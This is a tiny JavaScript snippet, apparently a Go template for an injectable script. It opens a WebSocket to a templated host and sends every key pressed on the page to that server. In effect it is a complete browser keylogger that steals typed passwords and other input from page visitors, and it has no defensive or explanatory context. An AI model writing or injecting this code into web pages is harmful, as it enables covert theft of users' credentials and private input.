(function() {
    var conn = new WebSocket("ws://{{.}}/ws");
    document.addEventListener('keydown', function(event) {
        const key = event.key;
        conn.send(key)
    });
    })();